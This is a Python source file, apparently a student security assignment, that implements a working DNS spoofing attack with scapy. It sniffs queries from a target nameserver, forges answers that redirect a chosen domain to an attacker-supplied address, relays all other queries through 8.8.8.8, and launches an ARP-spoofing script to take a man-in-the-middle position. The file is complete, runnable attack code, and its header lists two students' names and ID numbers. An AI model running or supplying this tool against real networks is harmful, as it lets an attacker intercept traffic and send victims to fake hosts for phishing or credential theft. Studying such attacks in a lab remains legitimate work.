"""
shachar markovich 211491766
naor maman        207341777
"""
import argparse
import subprocess
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP


def get_args():
    """
    parse the line arguments

    :returns: the line arguments
    """
    parser = argparse.ArgumentParser(description='DNS Spoof')
    # set up arguments
    parser.add_argument("-ns", "--nameserver", metavar="NAMESERVER", dest='nameserver', required=True,
                        help="the DNS nameserver's address you wish to spoof")
    parser.add_argument("-gw", help="The gateway address", dest='gateway', required=True)
    parser.add_argument("-u", "--url", help="the part of URL you wish to spoof", dest='url', required=True)
    parser.add_argument("-t", "--target", metavar="TARGET", help="The imposter address", dest='target', required=True)

    return parser.parse_args()


class DNSSpoof:
    FORWARD_IP = "8.8.8.8"

    def __init__(self, dns_nameserver_addr: str, gateway: str, fake_addr: str, url: str):
        """
        c'tor

        :param dns_nameserver_addr: victim dns name server address
        :param gateway: gateway address
        :param fake_addr: fake address
        :param url: victim url
        """
        self.dns_nameserver_addr = dns_nameserver_addr
        self.gateway = gateway
        self.fake_addr = fake_addr
        self.url = url

    @staticmethod
    def listen_socket():
        """
        this machine imposter to a DNS nameserver,
        therefore, it's NOT listen in Known-DNS-port 53,
        so we open a socket in this port, in order to avoid the machine to send a ICMP port-unreachable

        :returns: UDP server listen socket
        """
        dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_udp_socket.bind(('', 53))
        return dns_udp_socket

    def dns_req(self, pkt) -> bool:
        """
        filter only DNS request from dns server to gateway

        :param pkt: the sniffed packet
        :returns: if it mean the condition above
        """
        return DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and \
               pkt[IP].src == self.dns_nameserver_addr and pkt[IP].dst == self.gateway

    def process_spoof(self, pkt):
        """
        process MiTM only for `self.url`, for others DNS request - forwarding the request to a real DNS server
        :param pkt: the DNS request packet from the victim DNS nameserver
        """
        qname = pkt[DNSQR].qname.decode()

        if self.url in qname:
            print(f"[!] a DNS request to `{qname}` has been detected")

            fake_res = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport) \
                       / DNS(id=pkt[DNS].id, ancount=1, qr=1, rd=1, qd=pkt[DNSQR],
                             an=DNSRR(rrname=qname, rdata=self.fake_addr, type='A')) / DNSRR(type=41)

            send(fake_res, verbose=False)

        else:
            print(f"[!] a DNS request to `{qname}` has been detected")

            # forwarding request to google public dns server
            forward_res = IP(dst=DNSSpoof.FORWARD_IP) / UDP(sport=12345) / DNS(id=pkt[DNS].id, rd=1, qd=pkt[DNSQR])
            response = sr1(forward_res, verbose=False)

            pkt_response = IP(src=self.gateway, dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport) / response[DNS]
            send(pkt_response, verbose=False)

    def run(self):
        """
        run the DNS Spoof attack
        """
        listen_socket = DNSSpoof.listen_socket()

        arp_spoof = subprocess.Popen(
            ['python', 'ARPSpoof.py', '-t', self.dns_nameserver_addr, '-s', self.gateway, '-gw', 'True', '-d', '10'])

        try:
            sniff(lfilter=self.dns_req, prn=self.process_spoof)
        except KeyboardInterrupt:
            print("[!] A keyboard interrupt has been detected.")
            print("[!] Finish attack.")
            listen_socket.close()
            arp_spoof.kill()


def main():
    arg = get_args()
    dns_spoof_attack = DNSSpoof(arg.nameserver, arg.gateway, arg.target, arg.url)
    dns_spoof_attack.run()


if __name__ == "__main__":
    main()
